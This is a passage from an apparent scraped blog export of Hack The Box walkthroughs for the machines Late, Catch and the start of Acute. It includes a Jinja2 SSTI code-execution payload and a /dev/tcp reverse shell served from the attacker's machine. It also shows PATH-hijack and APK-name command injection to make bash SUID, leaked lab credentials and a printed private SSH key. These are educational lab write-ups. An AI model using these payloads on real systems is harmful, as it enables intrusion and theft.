enumerate subdomains:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.156 -H 'Host: FUZZ.late.htb' -fw 828 images [Status: 200, Size: 2187, Words: 448, Lines: 64, Duration: 302ms]  Now, we can set images.late.htb in /etc/hosts and access:\nIt is a web application built in Flask (a Python web framework) that takes an image and extracts the text inside. Let\u0026rsquo;s try this feature with this image (taken as a screenshot from the terminal):\nThe server automatically downloads a results.txt file. Let\u0026rsquo;s use curl instead:\n$ curl images.late.htb/scanner -F file=@Late-test-image.png \u0026lt;p\u0026gt;Test \u0026lt;/p\u0026gt;  Foothold This is interesting, it is rendering the text inside the HTML response. Since it is running on Flask, we can try Server-Side Template Injection (SSTI) in Jinja2 (the default template engine for Flask)::\n$ curl images.late.htb/scanner -F file=@Late-test-ssti.png \u0026lt;p\u0026gt;49 \u0026lt;/p\u0026gt;  And it shows 49 (7*7), so it is vulnerable.\nExploiting SSTI Let\u0026rsquo;s get Remote Code Execution taking the following payload from PayloadsAllTheThings:\n{{ cycler.__init__.__globals__.os.popen('id').read() }}  Instead of id, we want to get a reverse shell on the system.\nThis time, I won\u0026rsquo;t be encoding the command in Base64 because the web application might fail extracting text. Instead, I can force the server to perform a GET request to my machine to retrieve a file index.html that contains the actual reverse shell command and pipe it to Bash:\n$ vim index.html $ cat index.html #!/bin/bash bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261 $ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  Now that everything is set up, we send the image:\n$ curl images.late.htb/scanner -F file=@Late-rce-ssti.png  We receive the GET request for the index.html:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.156 - - [] \"GET / HTTP/1.1\" 200 -  And the reverse shell hits nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.156. Ncat: Connection from 10.10.11.156:54444. bash: cannot set terminal process group (1206): Inappropriate ioctl for device bash: no job control in this shell svc_acc@late:~/app$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null svc_acc@late:~/app$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm svc_acc@late:~/app$ export TERM=xterm svc_acc@late:~/app$ export SHELL=bash svc_acc@late:~/app$ stty rows 50 columns 158  At this point, we can read the user.txt flag:\nsvc_acc@late:~/app$ cd svc_acc@late:~$ cat user.txt 3a121d4b78598d9e1d214af6647f1027  System enumaration We are user svc_acc. Let\u0026rsquo;s find which files and directories are owned by svc_acc:\nsvc_acc@late:~$ find / -user svc_acc 2/dev/null | grep -vE 'proc|sys|run|home' /usr/local/sbin /usr/local/sbin/ssh-alert.sh /dev/pts/0  There is a Bash script:\nsvc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh  #!/bin/bash RECIPIENT=\"root@late.htb\" SUBJECT=\"Email from Server Login: SSH Alert\" BODY=\" A SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a` \" if [ ${PAM_TYPE} = \"open_session\" ]; then echo \"Subject:${SUBJECT} ${BODY}\" | /usr/sbin/sendmail ${RECIPIENT} fi  It seems to be related with SSH logins. Let\u0026rsquo;s see if there is any other file that references ssh-alert.sh:\nsvc_acc@late:~$ grep -r ssh-alert.sh / 2/dev/null /etc/pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh ^C  There is a PAM (Pluggable Authentication Module) that uses ssh-alert.sh.\nWe notice that the script is stored in /usr/local/sbin, and the PATH variable has this directory the first:\nsvc_acc@late:~$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  Moreover, we are able to write in /usr/local/sbin because we own the directory:\nsvc_acc@late:~$ ls -l --time-style=+ /usr/local total 32 drwxr-xr-x 2 root root 4096 bin drwxr-xr-x 2 root root 4096 etc drwxr-xr-x 2 root root 4096 games drwxr-xr-x 2 root root 4096 include drwxr-xr-x 4 root root 4096 lib lrwxrwxrwx 1 root root 9 man -\u0026gt; share/man drwxr-xr-x 2 svc_acc svc_acc 4096 sbin drwxr-xr-x 7 root root 4096 share drwxr-xr-x 2 root root 4096 src  Privilege escalation The previous Bash script is running commands without the absolute path, so we are able to create malicious executable files that overwrite the legitimate ones. For example, uname.\nThe usual absolute path for uname is:\nsvc_acc@late:~$ which uname /bin/uname  But we are creating a new uname executable file that will set /bin/bash as a SUID binary:\nsvc_acc@late:~$ cat \u0026gt; /usr/local/sbin/uname #!/bin/bash chmod 4755 /bin/bash ^C svc_acc@late:~$ chmod +x /usr/local/sbin/uname  Since the malicious uname is inside /usr/local/sbin and this directory comes first in the PATH environment variable, now the command uname will be our new one:\nsvc_acc@late:~$ which uname /usr/local/sbin/uname  We can try to access SSH and try random passwords, but the ssh-alert.sh script is not executed, and so /bin/bash is not SUID yet.\nHence, we can guess that we need to log in successfully. For that, we see that svc_acc has a .ssh directory:\nsvc_acc@late:~$ ls -la total 40 drwxr-xr-x 7 svc_acc svc_acc 4096 Apr 7 13:51 . drwxr-xr-x 3 root root 4096 Jan 5 10:44 .. drwxrwxr-x 7 svc_acc svc_acc 4096 Apr 4 13:28 app lrwxrwxrwx 1 svc_acc svc_acc 9 Jan 16 18:45 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 svc_acc svc_acc 3771 Apr 4 2018 .bashrc drwx------ 3 svc_acc svc_acc 4096 Apr 7 13:51 .cache drwx------ 3 svc_acc svc_acc 4096 Jan 5 10:45 .gnupg drwxrwxr-x 5 svc_acc svc_acc 4096 Jan 5 12:13 .local -rw-r--r-- 1 svc_acc svc_acc 807 Apr 4 2018 .profile drwx------ 2 svc_acc svc_acc 4096 Apr 7 11:08 .ssh -rw-r----- 1 root svc_acc 33 Apr 21 11:24 user.txt  Moreover, it contains a private SSH key:\nsvc_acc@late:~$ cat .ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi /mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7 d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7 7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0 ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7 t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq 0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y 3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+ Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0 kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw== -----END RSA PRIVATE KEY-----  We can copy it to our machine and connect via SSH without using password and see that now /bin/bash is SUID:\n$ vim id_rsa $ chmod 600 id_rsa $ ssh -i id_rsa svc_acc@late.htb -bash-4.4$ source ~/.bashrc svc_acc@late:~$ ls -l /bin/bash -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash  Finally, we run bash -p to tell Bash to use the SUID privilege and we are root:\nsvc_acc@late:~$ bash -p bash-4.4# cat /root/root.txt c54e75a791e86353a647700ab1878431  ","image":"/images/HTB/Late/Late.png","permalink":"https://7rocky.github.io/en/htb/late/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine contains a Flask web application that extracts text from images and renders them, being vulnerable to SSTI. Then there is a PAM configured for SSH with relative paths that can be abused because of some privileges to ovewrite executables. Basic web exploitation and Linux enumeration skills are needed in order to compromise this machine","time":6,"title":"Late"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.150   Release: 12 / 03 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.150 -p 22,80,3000,5000,8000 Nmap scan report for 10.10.11.150 Host is up (0.086s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Catch Global Systems 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=UTF-8 | Set-Cookie: i_like_gitea=c4add8273ad10169; Path=/; HttpOnly | Set-Cookie: _csrf=mnsU0O5Ra5DDvk5hMde46oeBYXA6MTY1ODE3MDcyNzUxMDc4MTQ0Mg; Path=/; Expires=Tue, 19 Jul 2022 18:58:47 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\"en-US\" class=\"theme-\"\u0026gt; | \u0026lt;head data-suburl=\"\"\u0026gt; | \u0026lt;meta charset=\"utf-8\"\u0026gt; | \u0026lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u0026gt; | \u0026lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"\u0026gt; | \u0026lt;title\u0026gt; Catch Repositories \u0026lt;/title\u0026gt; | \u0026lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Set-Cookie: i_like_gitea=a52174aa7176ecac; Path=/; HttpOnly | Set-Cookie: _csrf=HmeoQlGnj2FP7rgeJT-YACIGwbk6MTY1ODE3MDczMzE2MjUyNDQ4Ng; Path=/; Expires=Tue, 19 Jul 2022 18:58:53 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Mon, 18 Jul 2022 18:58:53 GMT |_ Content-Length: 0 5000/tcp open upnp? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 302 Found | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Location: /login | Vary: Accept, Accept-Encoding | Content-Type: text/plain; charset=utf-8 | Content-Length: 28 | Set-Cookie: connect.sid=s%3AJOtQ3i7EmG91-WEf4EQIm57CDg8l6Qvt.wqsCV4JfUvlp54pre9ayq1zvMjJdCQVYMGfc%2BBkKKPA; Path=/; HttpOnly | Date: | Connection: close | Found. Redirecting to /login | HTTPOptions: | HTTP/1.1 200 OK | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Allow: GET,HEAD | Content-Type: text/html; charset=utf-8 | Content-Length: 8 | ETag: W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\" | Set-Cookie: connect.sid=s%3AMV6FPc2fj8xR1N8MB0sdWFGVlKpMTVRw.Nfg63NvC%2FRxP6po46sBGOZ1w2DhldLydbieGNTsj8VE; Path=/; HttpOnly | Vary: Accept-Encoding | Date: | Connection: close |_ GET,HEAD 8000/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Catch Global Systems Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 97.06 seconds  This machine has ports 22 (SSH), 80, 3000, 5000 and 8000 (HTTP) open.\nEnumeration If we go to http://10.10.11.150, we will see this website:\nAPK analysis Here we can download an APK file called catchv1.0.apk. Let\u0026rsquo;s start MobSF and upload the APK file:\nHere we can see a subdomain: status.catch.htb, but it contains the same website as above.\nTaking a look at the strings, we get three authentication tokens:\nMaybe we can authenticate to some service using these tokens.\nWeb enumeration Actually, http://10.10.11.150:3000 shows a Gitea instance:\nThen http://10.10.11.150:5000 is for Let\u0026rsquo;s Chat:\nAnd finally http://10.10.11.150:8000 is for Cachet:\nAPI enumeration Eventually, we will find out that Let\u0026rsquo;s Chat is has an API available with the following endpoints (more information in github.com):\nUsing the lets_chat_token in the Authorization request header, we can read information of some rooms from Let\u0026rsquo;s Chat:\n$ token='NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' $ curl 10.10.11.150:5000/rooms -sH \"Authorization: Bearer $token\" | jq [ { \"id\": \"61b86b28d984e2451036eb17\", \"slug\": \"status\", \"name\": \"Status\", \"description\": \"Cachet Updates and Maintenance\", \"lastActive\": \"2021-12-14T10:34:20.749Z\", \"created\": \"2021-12-14T10:00:08.384Z\", \"owner\": \"61b86aead984e2451036eb16\", \"private\": false, \"hasPassword\": false, \"participants\": [] }, { \"id\": \"61b8708efe190b466d476bfb\", \"slug\": \"android_dev\", \"name\": \"Android Development\", \"description\": \"Android App Updates, Issues \u0026 More\", \"lastActive\": \"2021-12-14T10:24:21.145Z\", \"created\": \"2021-12-14T10:23:10.474Z\", \"owner\": \"61b86aead984e2451036eb16\", \"private\": false, \"hasPassword\": false, \"participants\": [] }, { \"id\": \"61b86b3fd984e2451036eb18\", \"slug\": \"employees\", \"name\": \"Employees\", \"description\": \"New Joinees, Org updates\", \"lastActive\": \"2021-12-14T10:18:04.710Z\", \"created\": \"2021-12-14T10:00:31.043Z\", \"owner\": \"61b86aead984e2451036eb16\", \"private\": false, \"hasPassword\": false, \"participants\": [] } ]  To extract the room identifiers I will be using gron:\n$ curl 10.10.11.150:5000/rooms -sH \"Authorization: Bearer $token\" | gron | grep '\\.id' | norg [ { \"id\": \"61b86b28d984e2451036eb17\" }, { \"id\": \"61b8708efe190b466d476bfb\" }, { \"id\": \"61b86b3fd984e2451036eb18\" } ]  Foothold With a room ID, we can get all messages and take the contents (text key):\n$ curl 10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages -sH \"Authorization: Bearer $token\" | gron | grep text | norg [ { \"text\": \"ah sure!\" }, { \"text\": \"You should actually include this task to your list as well as a part of quarterly audit\" }, { \"text\": \"Also make sure we've our systems, applications and databases up-to-date.\" }, { \"text\": \"Excellent! \" }, { \"text\": \"Why not. We've this in our todo list for next quarter\" }, { \"text\": \"@john is it possible to add SSL to our status domain to make sure everything is secure ? \" }, { \"text\": \"Here are the credentials `john : E}V!mywu_69T4C}W`\" }, { \"text\": \"Sure one sec.\" }, { \"text\": \"Can you create an account for me ? \" }, { \"text\": \"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. \" } ]  Password reuse in Cachet And there we have a password for john: E}V!mywu_69T4C}W. If we try these credentials in other services, we will find out that they are valid for Cachet (http://10.10.11.150:8000):\nIf we go to \u0026ldquo;Settings\u0026rdquo;, we will discover that it is running Cachet version 2.4.0-dev:\nAt this point, we can search for vulnerabilities that affect this version. Actually, there are three: CVE-2021-39172, CVE-2021-39173 and CVE-2021-39174. The three of them are explained thoroughly at blog.sonarsource.com.\nCVE exploitation We can exploit the last one, which consists of leaking environment variables (loaded in a .env file) using syntax ${NAME} in the mail configuration (Server-Side Template Injection). After using ${DB_USERNAME} and ${DB_PASSWORD} (as stated in blog.sonarsource.com), we will leak a username (will) and a password (s2#4Fg0_%3!):\nUnexpectedly, these credentials are valid to connect to the machine using SSH, and we can get user.txt flag:\n$ ssh will@10.10.11.150 will@10.10.11.150's password: will@catch:~$ cat user.txt 6b9bf0acbbabd8de17ed0af217914b47  System enumeration After doing basic enumeration, we can enumerate processes using pspy and see a script running as root periodically:\nCMD: UID=0 PID=30203 | /bin/bash /opt/mdm/verify.sh CMD: UID=0 PID=30208 | openssl rand -hex 12 CMD: UID=0 PID=30209 | mv /opt/mdm/apk_bin/*.apk /root/mdm/apk_bin/7b5167a7e62e3fdbaea84162.apk CMD: UID=0 PID=30210 | jarsigner -verify /root/mdm/apk_bin/7b5167a7e62e3fdbaea84162.apk CMD: UID=0 PID=30230 | /bin/bash /opt/mdm/verify.sh CMD: UID=0 PID=30233 | grep -v verify.sh CMD: UID=0 PID=30232 | grep -v apk_bin CMD: UID=0 PID=30231 | ls -A /opt/mdm CMD: UID=0 PID=30237 | /usr/sbin/CRON -f CMD: UID=0 PID=30236 | /usr/sbin/CRON -f CMD: UID=0 PID=30239 | /bin/sh -c rm -rf /root/mdm/certified_apps/* CMD: UID=0 PID=30238 | /bin/sh -c rm -rf /root/mdm/certified_apps/* CMD: UID=0 PID=30240 | CMD: UID=0 PID=30241 | /bin/bash /opt/mdm/verify.sh CMD: UID=0 PID=30247 | jarsigner -verify /root/mdm/apk_bin/bf97a421280379d4c67f58ca.apk  Let\u0026rsquo;s analyze the source code for /opt/mdm/verify.sh, which is a Bash script:\n#!/bin/bash ################### # Signature Check # ################### sig_check() { jarsigner -verify \"$1/$2\"2\u0026gt;/dev/null \u0026gt;/dev/null if[[ $? -eq0 ]];then echo'[+] Signature Check Passed' else echo'[!] Signature Check Failed. Invalid Certificate.' cleanup exit fi } ####################### # Compatibility Check # ####################### comp_check() { apktool d -s \"$1/$2\"-o $3 2\u0026gt;/dev/null \u0026gt;/dev/null COMPILE_SDK_VER=$(grep -oPm1 \"(?\u0026lt;=compileSdkVersion=\\\")[^\\\"]+\" \"$PROCESS_BIN/AndroidManifest.xml\") if[ -z\"$COMPILE_SDK_VER\"];then echo'[!] Failed to find target SDK version.' cleanup exit else if[ $COMPILE_SDK_VER -lt18 ];then echo\"[!] APK Doesn't meet the requirements\" cleanup exit fi fi } #################### # Basic App Checks # #################### app_check() { APP_NAME=$(grep -oPm1 \"(?\u0026lt;=\u0026lt;string name=\\\"app_name\\\"\u0026gt;)[^\u0026lt;]+\" \"$1/res/values/strings.xml\") echo$APP_NAME if[[ $APP_NAME ==*\"Catch\"*]];then echo-n $APP_NAME|xargs -I {} sh -c 'mkdir {}' mv \"$3/$APK_NAME\"\"$2/$APP_NAME/$4\" else echo\"[!] App doesn't belong to Catch Global\" cleanup exit fi } ########### # Cleanup # ########### cleanup() { rm -rf $PROCESS_BIN;rm -rf \"$DROPBOX/*\"\"$IN_FOLDER/*\";rm -rf $(ls -A /opt/mdm |grep -v apk_bin |grep -v verify.sh) } ################### # MDM CheckerV1.0 # ################### DROPBOX=/opt/mdm/apk_bin IN_FOLDER=/root/mdm/apk_bin OUT_FOLDER=/root/mdm/certified_apps PROCESS_BIN=/root/mdm/process_bin forIN_APK_NAME in$DROPBOX/*.apk;do OUT_APK_NAME=\"$(echo ${IN_APK_NAME##*/}|cut -d '.' -f1)_verified.apk\" APK_NAME=\"$(openssl rand -hex 12).apk\" if[[ -L\"$IN_APK_NAME\"]];then exit else mv \"$IN_APK_NAME\"\"$IN_FOLDER/$APK_NAME\" fi sig_check $IN_FOLDER $APK_NAME comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME done cleanup  Basically, it takes every APK file at /opt/mdm/apk_bin and applies functions sig_check, comp_check and app_check on them:\n sig_check makes use of jarsigner to check that the APK file has a valid signature; otherwise, it exits comp_check reads AndroidManifest.xml after extracting files with apktool in order to verify that the Android SDK version is at least 18 app_check reads res/values/strings.xml and checks that the string \u0026quot;Catch\u0026quot; is contained within the app_name string. If this occurs, it will execute these lines of code:  APP_NAME=$(grep -oPm1 \"(?\u0026lt;=\u0026lt;string name=\\\"app_name\\\"\u0026gt;)[^\u0026lt;]+\" \"$1/res/values/strings.xml\") echo$APP_NAME if[[ $APP_NAME ==*\"Catch\"*]];then echo-n $APP_NAME|xargs -I {} sh -c 'mkdir {}' mv \"$3/$APK_NAME\"\"$2/$APP_NAME/$4\" # ... fi  Privilege escalation The only thing we can control on this Bash script is $APP_NAME. In fact, the code is vulnerable to command injection because there is no double quotes surrounding $APP_NAME. This can lead to command injection, here\u0026rsquo;s a simple proof of concept:\n$ APP_NAME='Catch | whoami' $ echo $APP_NAME | xargs -I {} sh -c 'echo {}' rocky  So we can take the APK file we got at the beginning, extract its content using apktool, modify the app_name accordingly and build it again with apktool:\n$ apktool d catchv1.0.apk I: Using Apktool 2.6.1 on catchv1.0.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... $ vim app_name catchv1.0/res/values/strings.xml $ grep app_name catchv1.0/res/values/strings.xml \u0026lt;string name=\"app_name\"\u0026gt;Catch | chmod 4755 /bin/bash; echo \u0026lt;/string\u0026gt; $ apktool b catchv1.0 I: Using Apktool 2.6.1 I: Checking whether sources has changed... I: Smaling smali folder into classes.dex... I: Checking whether resources has changed... I: Building resources... I: Building apk file... I: Copying unknown files/dir... I: Built apk...  With the payload above we will attempt to set /bin/bash as a SUID binary. So once we put the APK file at /opt/mdm/apk_bin and root executes the Bash script, /bin/bash should be SUID:\nwill@catch:/tmp$ cd /opt/mdm/apk_bin will@catch:/opt/mdm/apk_bin$ ls -l --time-style=+ /bin/bash -rwxr-xr-x 1 root root 1183448 /bin/bash will@catch:/opt/mdm/apk_bin$ wget -q 10.10.17.44/catchv1.0.apk will@catch:/opt/mdm/apk_bin$ ls -l --time-style=+ total 2724 drwxrwx--x+ 2 root root 4096 ./ drwxr-x--x+ 3 root root 4096 ../ -rw-rw-r-- 1 will will 2778468 catchv1.0.apk will@catch:/opt/mdm/apk_bin$ ls -l --time-style=+ /bin/bash -rwsr-xr-x 1 root root 1183448 /bin/bash  Alright, so we can run Bash as root:\nwill@catch:/opt/mdm/apk_bin$ bash -p bash-5.0# cat /root/root.txt a4be51d5332126cbbb61423f2233f0a4  ","image":"/images/HTB/Catch/Catch.png","permalink":"https://7rocky.github.io/en/htb/catch/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine offers an APK file that contains hard-coded authentication tokens for some services exposed by the machine. One of the tokens can be used to enumerate a Let\u0026rsquo;s Chat application using its API and get credentials for Cachet. This service is vulnerable to Server-Side Template Injection in PHP and we can get more credentials to access via SSH. The machine has a Cron job configured to analyze APK files using a Bash script that is vulnerable to command injection, so we need to upload a maliciously crafted APK file to exploit it and become root","time":8,"title":"Catch"},{"contents":"  OS: Windows   Difficulty: Hard   IP Address: 10.10.11.145   Release: 12 / 02 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.145 -p 443 Nmap scan report for 10.10.11.145 Host is up (0.072s latency). PORT STATE SERVICE VERSION 443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=atsserver.acute.local | Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver | Not valid before: 2022-01-06T06:34:58 |_Not valid after: 2030-01-04T06:34:58 |_ssl-date: 2022-02-12T19:04:45+00:00; -17s from scanner time. | tls-alpn: |_ http/1.1 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -17s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 26.62 seconds  This machine has port 443 (HTTPS) open.\nEnumeration If we go to https://10.10.11.145, we won\u0026rsquo;t see anything:\nWe can find a subdomain called atsserver.acute.local in the output of nmap. Now we can add this subdomain to /etc/hosts and acute.local just in case. And we see a website going to https://atsserver.acute.local:\nThere is an \u0026ldquo;about\u0026rdquo; section where we can download a Microsoft Word document (.docx), clicking on the top-right button called \u0026ldquo;New Starter Forms\u0026rdquo;:\nThe Word document tells some instructions for new staff joining the company. Some useful information is here:\n The University’s staff induction pages can be found at: https://atsserver.acute.local/Staff\n  The Staff Induction portal can be found here: https://atsserver.acute.local/Staff/Induction\n  Arrange for the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default Password1!. Not all staff are changing these so please be sure to run through this\n  Run through the new PSWA to highlight the restrictions set on the sessions named dc_manage\n  Complete the remote (https://atsserver.acute.local/acute_staff_access) training\n  Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin\n We found three more web endpoints, although only one works:\nNice, this is an access to a certain computer via PowerShell (PWSA), but we need credentials and a computer name to connect to.\nUser enumeration As in most Windows machines, usernames are relevant for exploitation.\nThe Word document shows a user called Lois and a potential password: Password1!.\nLooking at the metadata using exiftool we see more things:\n$ exiftool New_Starter_CheckList_v7.docx ExifTool Version Number : 12.30 File Name : New_Starter_CheckList_v7.docx ... Zip Compressed Size : 428 Zip Uncompressed Size : 2527 Zip File Name : [Content_Types].xml Creator : FCastle Description : Created on Acute-PC01 Last Modified By : Daniel Revision Number : 8 Last Printed : 2021:01:04 15:54:00Z Create Date : 2021:12:08 14:21:00Z Modify Date : 2021:12:22 00:39:00Z Template : Normal.dotm Total Edit Time : 2.6 hours Pages : 3 Words : 886 Characters : 5055 Application : Microsoft Office Word Doc Security : None Lines : 42 Paragraphs : 11 Scale Crop : No Heading Pairs : Title, 1 Titles Of Parts : Company : University of Marvel Links Up To Date : No Characters With Spaces : 5930 Shared Doc : No Hyperlinks Changed : No App Version : 16.0000  We have two usernames (FCastle and Daniel) and a computer name (Acute-PC01).\nNow we can use this computer name, the password and these usernames to use PSWA, but none of them work.\nIn fact, we can find more users in the \u0026ldquo;about\u0026rdquo; section of the website:\nSince there is a username called FCastle, we can guess that the usernames are obtained using the first letter of the name followed by the surname.\nSo we have these usernames at the moment:\n Lois (LHopkins) Daniel FCastle AWallace CHall EDavies IMonks JMorgan  Foothold We can use a password spray attack on these usernames and try to connect to Acute-PC01 from PSWA. The connection is successful for EDavies:Password1!:\nAnalyzing Acute-PC01 We can perform a basic recognition of the system:\nPS C:\\Users\\edavies\\Documents\u0026gt; dir C:\\ Directory: C:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 07/12/2019 9:14 PerfLogs d-r--- 